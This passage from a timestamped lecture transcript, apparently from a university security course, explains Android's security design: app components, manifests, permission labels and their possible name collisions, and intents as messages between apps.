              <time_slice>3:48</time_slice>
              <text_slice>can-- because Android
is what we use,</text_slice>
            </slice>
            <slice>
              <time_slice>3:50</time_slice>
              <text_slice>we can look at various
vulnerability reports.</text_slice>
            </slice>
            <slice>
              <time_slice>3:53</time_slice>
              <text_slice>So there's this
database called CVE</text_slice>
            </slice>
            <slice>
              <time_slice>3:55</time_slice>
              <text_slice>that catalogs lots of
common vulnerabilities</text_slice>
            </slice>
            <slice>
              <time_slice>3:58</time_slice>
              <text_slice>in software systems.</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>And it's actually
kind of interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>4:02</time_slice>
              <text_slice>There is a number of reports,
of course, of bugs in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>And many of them are of the
flavor you guys have already</text_slice>
            </slice>
            <slice>
              <time_slice>4:09</time_slice>
              <text_slice>seen in the class.</text_slice>
            </slice>
            <slice>
              <time_slice>4:10</time_slice>
              <text_slice>So there's still
buffer overflows</text_slice>
            </slice>
            <slice>
              <time_slice>4:12</time_slice>
              <text_slice>in some parts of Android.</text_slice>
            </slice>
            <slice>
              <time_slice>4:13</time_slice>
              <text_slice>There's bad default
choices for crypto systems.</text_slice>
            </slice>
            <slice>
              <time_slice>4:15</time_slice>
              <text_slice>People forget to initialize
the random number</text_slice>
            </slice>
            <slice>
              <time_slice>4:18</time_slice>
              <text_slice>generator sometimes and
generate predictable keys.</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>So all these things
do still happen.</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>It's software.</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>It's not immune from any
of the other problems</text_slice>
            </slice>
            <slice>
              <time_slice>4:26</time_slice>
              <text_slice>we've seen so far.</text_slice>
            </slice>
            <slice>
              <time_slice>4:27</time_slice>
              <text_slice>But one cool thing
is that there doesn't</text_slice>
            </slice>
            <slice>
              <time_slice>4:30</time_slice>
              <text_slice>seem to be a huge
number of these issues.</text_slice>
            </slice>
            <slice>
              <time_slice>4:31</time_slice>
              <text_slice>So they crop up
from time to time.</text_slice>
            </slice>
            <slice>
              <time_slice>4:33</time_slice>
              <text_slice>But by large, can
fix these issues.</text_slice>
            </slice>
            <slice>
              <time_slice>4:36</time_slice>
              <text_slice>And the system remains
reasonably secure</text_slice>
            </slice>
            <slice>
              <time_slice>4:39</time_slice>
              <text_slice>after you fix these bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>4:41</time_slice>
              <text_slice>So in many ways,
this, I think, design</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>is working reasonably well.</text_slice>
            </slice>
            <slice>
              <time_slice>4:46</time_slice>
              <text_slice>So we'll look at it, I guess,
in more details later on as</text_slice>
            </slice>
            <slice>
              <time_slice>4:49</time_slice>
              <text_slice>to which parts of the design
are working to various degrees.</text_slice>
            </slice>
            <slice>
              <time_slice>4:52</time_slice>
              <text_slice>But it seems to be a reasonably
well thought out design.</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>Or at least much more so than
desktop Unix applications</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>that you've seen so far.</text_slice>
            </slice>
            <slice>
              <time_slice>5:05</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>5:06</time_slice>
              <text_slice>So maybe one way to approach
this is to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>5:10</time_slice>
              <text_slice>how we're going to protect
data and various services</text_slice>
            </slice>
            <slice>
              <time_slice>5:12</time_slice>
              <text_slice>that might cost you
money, et cetera,</text_slice>
            </slice>
            <slice>
              <time_slice>5:14</time_slice>
              <text_slice>from malicious applications
is first to understand</text_slice>
            </slice>
            <slice>
              <time_slice>5:17</time_slice>
              <text_slice>what does an application look
like in an Android system.</text_slice>
            </slice>
            <slice>
              <time_slice>5:21</time_slice>
              <text_slice>And then we'll talk about
how various permissions</text_slice>
            </slice>
            <slice>
              <time_slice>5:24</time_slice>
              <text_slice>or privileges are configured in
that application and enforced.</text_slice>
            </slice>
            <slice>
              <time_slice>5:30</time_slice>
              <text_slice>So Android applications are
quite different from what</text_slice>
            </slice>
            <slice>
              <time_slice>5:34</time_slice>
              <text_slice>you've seen so far in terms
of desktop apps or web</text_slice>
            </slice>
            <slice>
              <time_slice>5:38</time_slice>
              <text_slice>applications.</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>So instead of being
a monolithic piece</text_slice>
            </slice>
            <slice>
              <time_slice>5:41</time_slice>
              <text_slice>of code with a main function
that you start running,</text_slice>
            </slice>
            <slice>
              <time_slice>5:43</time_slice>
              <text_slice>and you just keep
going forever, they're</text_slice>
            </slice>
            <slice>
              <time_slice>5:46</time_slice>
              <text_slice>actually much more modular.</text_slice>
            </slice>
            <slice>
              <time_slice>5:47</time_slice>
              <text_slice>And the application, in the
case of Android, is-- actually,</text_slice>
            </slice>
            <slice>
              <time_slice>5:52</time_slice>
              <text_slice>you can think of it as a
collection of components.</text_slice>
            </slice>
            <slice>
              <time_slice>5:55</time_slice>
              <text_slice>And the paper talks about
four kinds of components</text_slice>
            </slice>
            <slice>
              <time_slice>5:59</time_slice>
              <text_slice>that the Android
framework provides to you</text_slice>
            </slice>
            <slice>
              <time_slice>6:03</time_slice>
              <text_slice>or gets the developer
to think in terms of.</text_slice>
            </slice>
            <slice>
              <time_slice>6:05</time_slice>
              <text_slice>And the components
are roughly-- there's</text_slice>
            </slice>
            <slice>
              <time_slice>6:08</time_slice>
              <text_slice>something called an activity.</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>You might have an
activity component.</text_slice>
            </slice>
            <slice>
              <time_slice>6:12</time_slice>
              <text_slice>And this is just a thing
that has a user interface.</text_slice>
            </slice>
            <slice>
              <time_slice>6:16</time_slice>
              <text_slice>So these are things that
actually display things</text_slice>
            </slice>
            <slice>
              <time_slice>6:18</time_slice>
              <text_slice>to the user, or take
user input, touches,</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>key presses, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>6:23</time_slice>
              <text_slice>In terms of security,
the Activity thing</text_slice>
            </slice>
            <slice>
              <time_slice>6:26</time_slice>
              <text_slice>has an interesting security
property that you probably</text_slice>
            </slice>
            <slice>
              <time_slice>6:28</time_slice>
              <text_slice>want to make sure your
user input is going</text_slice>
            </slice>
            <slice>
              <time_slice>6:30</time_slice>
              <text_slice>to one activity at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>6:33</time_slice>
              <text_slice>So the framework-- I believe
[? an ?] Android actually</text_slice>
            </slice>
            <slice>
              <time_slice>6:36</time_slice>
              <text_slice>ensures that there is only
one activity that's getting</text_slice>
            </slice>
            <slice>
              <time_slice>6:39</time_slice>
              <text_slice>your user input at a time.</text_slice>
            </slice>
            <slice>
              <time_slice>6:40</time_slice>
              <text_slice>So if you are running
your bank application,</text_slice>
            </slice>
            <slice>
              <time_slice>6:43</time_slice>
              <text_slice>you can be reasonably
confident that there's not</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>other applications in the
background grabbing the screen</text_slice>
            </slice>
            <slice>
              <time_slice>6:49</time_slice>
              <text_slice>presses corresponding to your
PIN number in your bank app.</text_slice>
            </slice>
            <slice>
              <time_slice>6:53</time_slice>
              <text_slice>So having the framework be aware
of these different activities</text_slice>
            </slice>
            <slice>
              <time_slice>6:58</time_slice>
              <text_slice>helps enforce some security
properties with respect</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>to user input.</text_slice>
            </slice>
            <slice>
              <time_slice>7:03</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>7:04</time_slice>
              <text_slice>So these guys are the
user interface components</text_slice>
            </slice>
            <slice>
              <time_slice>7:07</time_slice>
              <text_slice>of an application.</text_slice>
            </slice>
            <slice>
              <time_slice>7:08</time_slice>
              <text_slice>And then there's
three other types</text_slice>
            </slice>
            <slice>
              <time_slice>7:11</time_slice>
              <text_slice>of components that mostly
help an application</text_slice>
            </slice>
            <slice>
              <time_slice>7:14</time_slice>
              <text_slice>structure its own sort
of logic and interaction</text_slice>
            </slice>
            <slice>
              <time_slice>7:19</time_slice>
              <text_slice>with other components.</text_slice>
            </slice>
            <slice>
              <time_slice>7:21</time_slice>
              <text_slice>So there is something
called a service component.</text_slice>
            </slice>
            <slice>
              <time_slice>7:25</time_slice>
              <text_slice>And this guy just runs
in the background.</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>So you might have
a service component</text_slice>
            </slice>
            <slice>
              <time_slice>7:29</time_slice>
              <text_slice>that monitors your location,
like in the application</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>these guys describe
in the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>7:36</time_slice>
              <text_slice>Or you might have
services that pull things</text_slice>
            </slice>
            <slice>
              <time_slice>7:37</time_slice>
              <text_slice>from the network in the
background, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>7:42</time_slice>
              <text_slice>These guys have a content
provider component.</text_slice>
            </slice>
            <slice>
              <time_slice>7:47</time_slice>
              <text_slice>And you can think of
these guys as just SQL</text_slice>
            </slice>
            <slice>
              <time_slice>7:52</time_slice>
              <text_slice>database you can define.</text_slice>
            </slice>
            <slice>
              <time_slice>7:54</time_slice>
              <text_slice>Or you can define
a couple of tables</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>with a schema, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>7:56</time_slice>
              <text_slice>And you can run SQL
queries all over the data</text_slice>
            </slice>
            <slice>
              <time_slice>7:59</time_slice>
              <text_slice>stored in that application.</text_slice>
            </slice>
            <slice>
              <time_slice>8:00</time_slice>
              <text_slice>And having it be a
component is going</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>to allow the framework
to control access</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>to this database to say
who's allowed to run queries</text_slice>
            </slice>
            <slice>
              <time_slice>8:08</time_slice>
              <text_slice>against it.</text_slice>
            </slice>
            <slice>
              <time_slice>8:09</time_slice>
              <text_slice>And then there's
something kind of unusual</text_slice>
            </slice>
            <slice>
              <time_slice>8:14</time_slice>
              <text_slice>that hasn't shown up in other
systems-- something called</text_slice>
            </slice>
            <slice>
              <time_slice>8:16</time_slice>
              <text_slice>a broadcast receiver.</text_slice>
            </slice>
            <slice>
              <time_slice>8:22</time_slice>
              <text_slice>And this guy is going to be
used for receiving messages</text_slice>
            </slice>
            <slice>
              <time_slice>8:26</time_slice>
              <text_slice>from other parts of the system.</text_slice>
            </slice>
            <slice>
              <time_slice>8:28</time_slice>
              <text_slice>So we'll talk about how
applications interact with one</text_slice>
            </slice>
            <slice>
              <time_slice>8:30</time_slice>
              <text_slice>other in terms of messages.</text_slice>
            </slice>
            <slice>
              <time_slice>8:34</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>8:34</time_slice>
              <text_slice>So this is some very
high-level logical view</text_slice>
            </slice>
            <slice>
              <time_slice>8:38</time_slice>
              <text_slice>of how you can think of
an Android application.</text_slice>
            </slice>
            <slice>
              <time_slice>8:40</time_slice>
              <text_slice>But in reality, all these are
just Java classes or Java code</text_slice>
            </slice>
            <slice>
              <time_slice>8:46</time_slice>
              <text_slice>that the developer writes.</text_slice>
            </slice>
            <slice>
              <time_slice>8:48</time_slice>
              <text_slice>And there's just some standard
interface for an activity,</text_slice>
            </slice>
            <slice>
              <time_slice>8:51</time_slice>
              <text_slice>for a service, for a
broadcast receiver,</text_slice>
            </slice>
            <slice>
              <time_slice>8:53</time_slice>
              <text_slice>for a content provider
that you implement.</text_slice>
            </slice>
            <slice>
              <time_slice>8:55</time_slice>
              <text_slice>But clearly, this is
all just Java code.</text_slice>
            </slice>
            <slice>
              <time_slice>8:57</time_slice>
              <text_slice>And this application box is
really just a Java runtime</text_slice>
            </slice>
            <slice>
              <time_slice>9:02</time_slice>
              <text_slice>that runs on top of your phone.</text_slice>
            </slice>
            <slice>
              <time_slice>9:06</time_slice>
              <text_slice>And it's just a single
process on the Linux</text_slice>
            </slice>
            <slice>
              <time_slice>9:10</time_slice>
              <text_slice>kernel running on your phone.</text_slice>
            </slice>
            <slice>
              <time_slice>9:12</time_slice>
              <text_slice>And all these
components are just</text_slice>
            </slice>
            <slice>
              <time_slice>9:13</time_slice>
              <text_slice>different classes or pieces
of code running inside</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>of this Java runtime process.</text_slice>
            </slice>
            <slice>
              <time_slice>9:19</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>9:20</time_slice>
              <text_slice>That's how it sort of translates
to traditional processes</text_slice>
            </slice>
            <slice>
              <time_slice>9:24</time_slice>
              <text_slice>that you might
understand otherwise.</text_slice>
            </slice>
            <slice>
              <time_slice>9:27</time_slice>
              <text_slice>And the other thing that sort
of shifts with an application</text_slice>
            </slice>
            <slice>
              <time_slice>9:31</time_slice>
              <text_slice>is what's called a manifest.</text_slice>
            </slice>
            <slice>
              <time_slice>9:32</time_slice>
              <text_slice>So this is code that the
application developer</text_slice>
            </slice>
            <slice>
              <time_slice>9:36</time_slice>
              <text_slice>writes or compiles.</text_slice>
            </slice>
            <slice>
              <time_slice>9:37</time_slice>
              <text_slice>But there's also
this manifest that</text_slice>
            </slice>
            <slice>
              <time_slice>9:39</time_slice>
              <text_slice>sits on the side, which
is a text or an XML file,</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>really, that describes
all these components</text_slice>
            </slice>
            <slice>
              <time_slice>9:46</time_slice>
              <text_slice>and how other
parts of the system</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>should interact with
this application.</text_slice>
            </slice>
            <slice>
              <time_slice>9:51</time_slice>
              <text_slice>So in particular,
this manifest is</text_slice>
            </slice>
            <slice>
              <time_slice>9:53</time_slice>
              <text_slice>going to talk about
things called labels</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>that we'll talk about
in a second that</text_slice>
            </slice>
            <slice>
              <time_slice>9:58</time_slice>
              <text_slice>define both the privileges
of this application in terms</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>of what it should
be allowed to do</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>as well as the
restrictions on who else</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>should be able to interact
with the different components</text_slice>
            </slice>
            <slice>
              <time_slice>10:10</time_slice>
              <text_slice>of this application.</text_slice>
            </slice>
            <slice>
              <time_slice>10:13</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>10:15</time_slice>
              <text_slice>Questions about how that works?</text_slice>
            </slice>
            <slice>
              <time_slice>10:18</time_slice>
              <text_slice>AUDIENCE: Is the
label something like,</text_slice>
            </slice>
            <slice>
              <time_slice>10:20</time_slice>
              <text_slice>this app cannot do the phone
call, or this app can send--</text_slice>
            </slice>
            <slice>
              <time_slice>10:24</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>10:24</time_slice>
              <text_slice>So these labels are
going to be things</text_slice>
            </slice>
            <slice>
              <time_slice>10:26</time_slice>
              <text_slice>like, well, this application
can dial a phone,</text_slice>
            </slice>
            <slice>
              <time_slice>10:29</time_slice>
              <text_slice>or can send an SMS message,
or can use the internet.</text_slice>
            </slice>
            <slice>
              <time_slice>10:33</time_slice>
              <text_slice>So there's really
two kinds of labels.</text_slice>
            </slice>
            <slice>
              <time_slice>10:35</time_slice>
              <text_slice>So we can draw them out here.</text_slice>
            </slice>
            <slice>
              <time_slice>10:36</time_slice>
              <text_slice>So each application
has a list of labels</text_slice>
            </slice>
            <slice>
              <time_slice>10:41</time_slice>
              <text_slice>that describe the privileges
that the application has.</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>So these are something
like maybe DIAL PERMISSION</text_slice>
            </slice>
            <slice>
              <time_slice>10:48</time_slice>
              <text_slice>for dialing a phone,
maybe INTERNET, et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>10:54</time_slice>
              <text_slice>So we'll talk about how they're
described in a little bit.</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>So these are privileges
that the application has.</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>But then you can
also stick labels</text_slice>
            </slice>
            <slice>
              <time_slice>11:01</time_slice>
              <text_slice>on top of individual components.</text_slice>
            </slice>
            <slice>
              <time_slice>11:03</time_slice>
              <text_slice>And there, they have
a different meaning.</text_slice>
            </slice>
            <slice>
              <time_slice>11:06</time_slice>
              <text_slice>So these are privileges
that the application has.</text_slice>
            </slice>
            <slice>
              <time_slice>11:09</time_slice>
              <text_slice>If you have a label
[? on a ?] component,</text_slice>
            </slice>
            <slice>
              <time_slice>11:11</time_slice>
              <text_slice>it's a requirement
on anyone that</text_slice>
            </slice>
            <slice>
              <time_slice>11:13</time_slice>
              <text_slice>talks with the component to
have the corresponding label.</text_slice>
            </slice>
            <slice>
              <time_slice>11:16</time_slice>
              <text_slice>So in their example,
maybe you have some sort</text_slice>
            </slice>
            <slice>
              <time_slice>11:20</time_slice>
              <text_slice>of a FRIEND VIEW privilege.</text_slice>
            </slice>
            <slice>
              <time_slice>11:25</time_slice>
              <text_slice>So you are able to view the
locations of your friends.</text_slice>
            </slice>
            <slice>
              <time_slice>11:29</time_slice>
              <text_slice>So that's like a privilege you
might have in an application.</text_slice>
            </slice>
            <slice>
              <time_slice>11:33</time_slice>
              <text_slice>So you're allowed to do this.</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>But then in order to
enforce this privilege,</text_slice>
            </slice>
            <slice>
              <time_slice>11:37</time_slice>
              <text_slice>you might actually put
this FRIEND VIEW label</text_slice>
            </slice>
            <slice>
              <time_slice>11:40</time_slice>
              <text_slice>onto a particular component.</text_slice>
            </slice>
            <slice>
              <time_slice>11:41</time_slice>
              <text_slice>So you might say, well, my
content provider, the database</text_slice>
            </slice>
            <slice>
              <time_slice>11:45</time_slice>
              <text_slice>storing the location
of all my friends,</text_slice>
            </slice>
            <slice>
              <time_slice>11:47</time_slice>
              <text_slice>might have the FRIEND
VIEW label attached to it.</text_slice>
            </slice>
            <slice>
              <time_slice>11:50</time_slice>
              <text_slice>And what this means
is that anyone that</text_slice>
            </slice>
            <slice>
              <time_slice>11:52</time_slice>
              <text_slice>wants to access
this database better</text_slice>
            </slice>
            <slice>
              <time_slice>11:54</time_slice>
              <text_slice>have this label in
their privilege set.</text_slice>
            </slice>
            <slice>
              <time_slice>11:57</time_slice>
              <text_slice>So that's how you
specify permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>12:00</time_slice>
              <text_slice>You can think these are as like
generalized user IDs or group</text_slice>
            </slice>
            <slice>
              <time_slice>12:04</time_slice>
              <text_slice>IDs from Unix, except
they're arbitrary</text_slice>
            </slice>
            <slice>
              <time_slice>12:06</time_slice>
              <text_slice>strings, which make them
slightly more flexible.</text_slice>
            </slice>
            <slice>
              <time_slice>12:08</time_slice>
              <text_slice>You don't run out of these guys.</text_slice>
            </slice>
            <slice>
              <time_slice>12:09</time_slice>
              <text_slice>You don't worry
so much about who</text_slice>
            </slice>
            <slice>
              <time_slice>12:11</time_slice>
              <text_slice>gets the number 25 or
silly things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>12:14</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>12:19</time_slice>
              <text_slice>PROFESSOR: Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>12:20</time_slice>
              <text_slice>So turns out these guys
aren't-- at least in the design,</text_slice>
            </slice>
            <slice>
              <time_slice>12:24</time_slice>
              <text_slice>weren't super careful in
scoping these guys out.</text_slice>
            </slice>
            <slice>
              <time_slice>12:27</time_slice>
              <text_slice>So you could totally have
two applications that decide</text_slice>
            </slice>
            <slice>
              <time_slice>12:29</time_slice>
              <text_slice>to introduce the same label.</text_slice>
            </slice>
            <slice>
              <time_slice>12:32</time_slice>
              <text_slice>So these labels are
application-defined, partly.</text_slice>
            </slice>
            <slice>
              <time_slice>12:35</time_slice>
              <text_slice>And you could have
two applications,</text_slice>
            </slice>
            <slice>
              <time_slice>12:37</time_slice>
              <text_slice>like Facebook and Google+.</text_slice>
            </slice>
            <slice>
              <time_slice>12:39</time_slice>
              <text_slice>They say, oh, we
want to both create</text_slice>
            </slice>
            <slice>
              <time_slice>12:41</time_slice>
              <text_slice>a new permission string that's
View Your Friends In A Social</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>Network.</text_slice>
            </slice>
            <slice>
              <time_slice>12:47</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:47</time_slice>
              <text_slice>Well, they're the same string.</text_slice>
            </slice>
            <slice>
              <time_slice>12:49</time_slice>
              <text_slice>So by convention,
what happens is</text_slice>
            </slice>
            <slice>
              <time_slice>12:51</time_slice>
              <text_slice>that these strings
are actually longer</text_slice>
            </slice>
            <slice>
              <time_slice>12:52</time_slice>
              <text_slice>than what I am drawing out.</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>And they have the domain
of the Java-style domain</text_slice>
            </slice>
            <slice>
              <time_slice>12:56</time_slice>
              <text_slice>of the application
defining it in the string.</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>So DIAL PERM, I
think, is actually</text_slice>
            </slice>
            <slice>
              <time_slice>13:01</time_slice>
              <text_slice>something like
com.google.android.dialperm.</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>I might have slightly
screwed this up.</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>But roughly, these are
the kinds of strings</text_slice>
            </slice>
            <slice>
              <time_slice>13:15</time_slice>
              <text_slice>that show up in permissions.</text_slice>
            </slice>
            <slice>
              <time_slice>13:16</time_slice>
              <text_slice>So if you have
well-meaning applications,</text_slice>
            </slice>
            <slice>
              <time_slice>13:19</time_slice>
              <text_slice>then they won't collide in terms
of these permission strings.</text_slice>
            </slice>
            <slice>
              <time_slice>13:23</time_slice>
              <text_slice>But it turns out
that nothing actually</text_slice>
            </slice>
            <slice>
              <time_slice>13:25</time_slice>
              <text_slice>enforces this,
unfortunately, in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>13:27</time_slice>
              <text_slice>So you do have some
potential problem</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>that arise as a result
of this, that-- I don't</text_slice>
            </slice>
            <slice>
              <time_slice>13:32</time_slice>
              <text_slice>know why they weren't fixed.</text_slice>
            </slice>
            <slice>
              <time_slice>13:34</time_slice>
              <text_slice>It's a little bit
tricky to fix them.</text_slice>
            </slice>
            <slice>
              <time_slice>13:36</time_slice>
              <text_slice>Maybe these guys
thought, well, let's</text_slice>
            </slice>
            <slice>
              <time_slice>13:38</time_slice>
              <text_slice>do them now, [? for ?]
maybe they weren't</text_slice>
            </slice>
            <slice>
              <time_slice>13:40</time_slice>
              <text_slice>thinking of these issues.</text_slice>
            </slice>
            <slice>
              <time_slice>13:40</time_slice>
              <text_slice>Anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>13:41</time_slice>
              <text_slice>So we'll see what
arises if you have</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>two applications that conflict
on the label names that we get.</text_slice>
            </slice>
            <slice>
              <time_slice>13:47</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>13:48</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>13:50</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>13:51</time_slice>
              <text_slice>So this is what a single
application looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>13:54</time_slice>
              <text_slice>It's a bunch of Java code,
a manifest describing</text_slice>
            </slice>
            <slice>
              <time_slice>13:57</time_slice>
              <text_slice>the permissions for
the application,</text_slice>
            </slice>
            <slice>
              <time_slice>13:59</time_slice>
              <text_slice>and the required restrictions
on all the components.</text_slice>
            </slice>
            <slice>
              <time_slice>14:03</time_slice>
              <text_slice>And then in order to communicate
between applications,</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>for the most part, it's
done through what's</text_slice>
            </slice>
            <slice>
              <time_slice>14:09</time_slice>
              <text_slice>called an intent,
which is an Android</text_slice>
            </slice>
            <slice>
              <time_slice>14:11</time_slice>
              <text_slice>thing that the developers of
this framework introduced.</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>And an intent-- you can think
of it as a structured message</text_slice>
            </slice>
            <slice>
              <time_slice>14:21</time_slice>
              <text_slice>that-- we'll see how these
components of an intent</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>are going to be
used in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>14:25</time_slice>
              <text_slice>But roughly, the intent
has three important things.</text_slice>
            </slice>
            <slice>
              <time_slice>14:28</time_slice>
              <text_slice>There's other fields, of course.</text_slice>
            </slice>
            <slice>
              <time_slice>14:30</time_slice>
              <text_slice>But the main thing is the name
of a component to which you</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>want to send a message.</text_slice>
            </slice>
            <slice>
              <time_slice>14:36</time_slice>
              <text_slice>There's the action that you
want the component to take</text_slice>
            </slice>
            <slice>
              <time_slice>14:40</time_slice>
              <text_slice>and the data, along
with a MIME type,</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>that you want to send
to this other component.</text_slice>
            </slice>
            <slice>
              <time_slice>14:49</time_slice>
              <text_slice>So just as an example--
this is a little abstract--</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>but what you can imagine is
that this component is maybe--</text_slice>
            </slice>
            <slice>
              <time_slice>14:55</time_slice>
              <text_slice>you could imagine
com.android.dialer/Dial</text_slice>
            </slice>
            <slice>
              <time_slice>15:04</time_slice>
              <text_slice>or something.</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>So this is how you name
a component in Android.</text_slice>
            </slice>
            <slice>
              <time_slice>15:09</time_slice>
              <text_slice>You specify the name
of the application,</text_slice>
            </slice>
            <slice>
              <time_slice>15:12</time_slice>
              <text_slice>which is kind of like this
Java inverted domain name.</text_slice>
            </slice>
            <slice>
              <time_slice>15:15</time_slice>
              <text_slice>Like, com.android.dialer
is the name</text_slice>
            </slice>
            <slice>
              <time_slice>15:17</time_slice>
              <text_slice>of an overall
application to which you</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>want to send an intent.</text_slice>
            </slice>
            <slice>
              <time_slice>15:20</time_slice>
              <text_slice>And then you write
something like /Dial.</text_slice>
            </slice>
            <slice>
              <time_slice>15:22</time_slice>
              <text_slice>And Dial is the
name of a component.</text_slice>
            </slice>
            <slice>
              <time_slice>15:24</time_slice>
              <text_slice>Would [? lend ?] that
target application to which</text_slice>
            </slice>
            <slice>
              <time_slice>15:26</time_slice>
              <text_slice>you are sending this message.</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>15:30</time_slice>
              <text_slice>So that's how you name
the particular component</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>where you want to send the guy.</text_slice>
            </slice>
            <slice>
              <time_slice>15:35</time_slice>
              <text_slice>The action, there's a
predefined set of actions.</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>You could stick in your
own things as well.</text_slice>
            </slice>
            <slice>
              <time_slice>15:41</time_slice>
              <text_slice>But you might have
something like, I think,</text_slice>
            </slice>
            <slice>
              <time_slice>15:44</time_slice>
              <text_slice>android.intent.DIAL.</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>So this is a pre-defined string
or, by convention, a string</text_slice>
            </slice>
            <slice>
              <time_slice>15:54</time_slice>
              <text_slice>that applications put
on the Action field</text_slice>
            </slice>
            <slice>
              <time_slice>15:57</time_slice>
              <text_slice>if they want the phone dialer
to dial a phone number for them.</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>So this is how you
stick something in here.</text_slice>
            </slice>
            <slice>
              <time_slice>16:03</time_slice>
              <text_slice>There's other actions.</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>Like, if you want
to view a document,</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>you will stick something.view
in the Action field.</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>This'll tell the
receiving component</text_slice>
            </slice>
            <slice>
              <time_slice>16:11</time_slice>
              <text_slice>that you just want to
view this object instead</text_slice>
            </slice>
            <slice>
              <time_slice>16:13</time_slice>
